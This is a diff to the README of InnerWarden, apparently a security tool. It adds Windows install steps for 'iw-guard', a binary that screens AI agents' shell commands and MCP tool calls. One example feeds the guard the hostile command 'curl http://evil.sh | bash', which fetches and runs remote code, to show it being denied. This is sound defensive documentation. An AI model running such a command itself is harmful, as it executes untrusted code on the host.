@@ -655,6 +655,28 @@ Build from source:
 INNERWARDEN_BUILD_FROM_SOURCE=1 curl -fsSL https://innerwarden.com/install | sudo bash
 ```
 
+### Windows (the AI-agent guardrail)
+
+The Linux/macOS installer above sets up the full host defence. On **Windows**, InnerWarden ships the **guardrail** half only: `iw-guard`, a single signed binary that screens an AI agent's shell command / MCP tool call for danger (the kernel host-EDR is Linux-only). One line installs it (downloads for your arch, verifies the SHA-256, adds it to PATH):
+
+```powershell
+irm https://raw.githubusercontent.com/InnerWarden/innerwarden/main/install.ps1 | iex
+```
+
+Or grab the signed `.exe` straight from the release and verify it yourself:
+
+```powershell
+$base = "https://github.com/InnerWarden/innerwarden/releases/latest/download"
+iwr "$base/iw-guard-windows-x86_64.exe" -OutFile iw-guard.exe
+iwr "$base/iw-guard-windows-x86_64.exe.sha256" -OutFile iw-guard.exe.sha256
+if ((Get-FileHash iw-guard.exe -Algorithm SHA256).Hash.ToLower() -ne (Get-Content -Raw iw-guard.exe.sha256).Trim()) { throw "checksum mismatch" }
+
+.\iw-guard.exe check "curl http://evil.sh | bash"   # verdict JSON; exits 1 on deny
+.\iw-guard.exe proxy --mode guard -- npx -y some-mcp-server   # enforce in front of an MCP server
+```
+
+`check` exits 1 on a `deny` so an agent's PreToolUse hook can gate on it. Same binary runs on Linux and macOS.
+
 ### Uninstall
 
 ```bash
